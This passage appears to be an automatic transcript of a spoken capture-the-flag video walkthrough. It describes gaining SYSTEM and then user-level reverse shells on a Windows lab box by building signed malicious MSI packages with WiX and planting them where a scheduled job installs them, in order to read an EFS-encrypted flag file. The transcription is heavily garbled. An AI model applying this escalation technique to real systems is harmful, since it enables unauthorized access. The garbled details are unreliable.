copied it there so we will have to kill OpenSSL shells and we will direct this to SMB test msi and on this one place on earth real we can copy this direct it to see : users public desktop test dot MSM shortcuts test msi ok we can kill this stir the listeners and then let's get a show again by copying the shortcut so CMD copy /y so we should be able to go to d : di our CD dev see the MSI's and then copy C : users public desktop shortcuts test dot MSI to this directory it's here we can kill our shells and start new ones and wait a few minutes and see if this MSI gets installed and if it does get installed if we did the creation portion correctly to get the reverse shell so we never got a shell so I think the next step is to go back and create a MSI that's a little bit cleaner so let's go here go back into a Wix and instead of doing this complicated command let's take advantage of something we already burn the box so C : users public desktop shortcuts please subscribe LNK that shortcut we've already placed on the box that to make this msi a bit less complicated whenever you do all those pipes things get potentially quick crazy so let's do Wix handle test Wix then Wix light and test dot Wix object okay and now we just need to sign it so sign tool file has been successfully signed so we can go to a SMB share and put test MSI there so back on a box you can do LS LA SMB it's there so let's put that here SMB slash test dot and I saw okay go over to a Python and we want to copy to test on MSI it's not there so let's just do we have any that program stuff to copy from cat CMD we can copy this send this to C colon users public desktop oh my god MSI forgot shortcuts okay it's there we've give enough time to get there so it should be there so the next thing to do is get a shell and then we'll copy it so copy this and got the C C copy please subscribe Ln K over top of that we should get a shell I wonder this box got reverted my shortcuts disappeared C : users public desktop shortcuts please subscribe Ln K over top of that try this again okay just took a while when we got the call back and something is seriously wrong there we go dir there we go so d : CD dev CD MSI's copy C : users public desktop forgot slash short God's test dot oh it was oh my god MSI here copy the file and now we wait for a shell we got a shell back we do Who am I we're anti-authority / system so we go to CD users then CD administrator CD desktop so we want to probably go to rupal maybe CD desktop type route text and we don't get anything we do hi cackles route text we should be able to read it cipher / let me get with the slashes I think it's ciphers route text will tell us ciphers question mark cipher question mark cipher route text I'm trying to show how we verify that it's actually encrypted so there is a flag for the cipher thing that will show the public key of the file so let's see displays information cipher /c so we see e route text so we have to be the rupal user to be able to decrypt this file we wanna do it here safer route text so we see the certificate thumbprint of who can decrypt this file so this just means we have to do one more time back into our MSI and have us not escalate to system so we're back on Windows if we open up test dot Wix we have this impersonate option if we change this to yes then we will impersonate the user that is running it so let's save this and see do we have all this in history we do so we're going to wick scandal test dot Wix let's delete everything here then we want to do light and finally we need the sign tool is then a different command prompt here we go we have signed it and let's copy it on over so we would call this D ask MSI copy it to files and now we just got to get it onto the box so we can get out of our SSL shells dot dot slash sm b DX MSI and we can copy it this command let's see D asked dot MSI okay it should be copied so now comes the time of getting back on the box and doing the final shell so copy the Visual Studio file should get show in a few seconds we did copy it it's always be hey Sonny right after you copy files I wonder if something on the backend is wonky so the whole new session copy there we go yeah we're good users public desktop shortcuts and then copy D ask MSI to D : dev MSI's d ask MSI okay get out of our shells and let's wait for it to hit us I've wait for the cron job so we got a shell we do Who am I we are now rupal no longer system so C D users rupal and if we go into desktop I guarantee you we can read route tax but unfortunately I can't do PowerShell and I don't have a good way to show route text without you being we'll just to copy and paste it so as rupal we can read this file just take my word for it and there will be it for this video I'm gonna do another one on this box with just doing the unintended brave ask because well oh wait that may have actually worked PowerShell what is the way to get file size in PowerShell get item route text dot length see if this works not sure if it will but anyways as I saying I'm sure you can agree this video went sideways so the second video on this will be just to the point and showing off a really cool technique so take care guys